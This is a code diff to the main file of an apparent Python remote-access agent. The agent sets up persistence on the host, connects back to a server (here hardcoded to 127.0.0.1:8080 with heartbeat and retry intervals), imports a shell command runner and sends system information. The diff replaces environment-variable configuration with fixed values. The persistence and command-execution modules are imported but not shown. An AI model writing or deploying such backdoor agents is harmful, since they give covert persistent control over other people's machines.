@@ -1,19 +1,15 @@
 import os
 import socket
 import time
-from dotenv import load_dotenv
 from data import get_system_info
 from shell import run_command
 from helper import send_json, receive_json
 from persistence import setup_persistence
 
-load_dotenv("../../.env")
-
-SERVER_HOST = os.getenv("SERVER_HOST")
-SERVER_PORT = int(os.getenv("SERVER_PORT"))
-
-MAX_TIMEOUT = int(os.getenv("AGENT_SEND_HEARTBEAT_INTERVAL"))  # Send heartbeat interval.
-RETRY_CONNECT_INTERVAL = int(os.getenv("AGENT_RETRY_CONNECTION_INTERVAL"))  # Retry connection interval.
+SERVER_HOST = "127.0.0.1"
+SERVER_PORT = 8080
+SEND_HEARTBEAT_INTERVAL = 180
+RETRY_CONNECT_INTERVAL = 10
 
 EXE_LOCATION, AGENT_ID_LOCATION = setup_persistence()  # Setup persistence and return exe and agent ID locations.
 
@@ -90,7 +86,7 @@ def connect_to_server(host: str, port: int) -> socket.socket:
 
 def main() -> None:
     s = connect_to_server(SERVER_HOST, SERVER_PORT)
-    s.settimeout(MAX_TIMEOUT)
+    s.settimeout(SEND_HEARTBEAT_INTERVAL)
     communicate(s, get_system_info())
 
 if __name__ == '__main__':
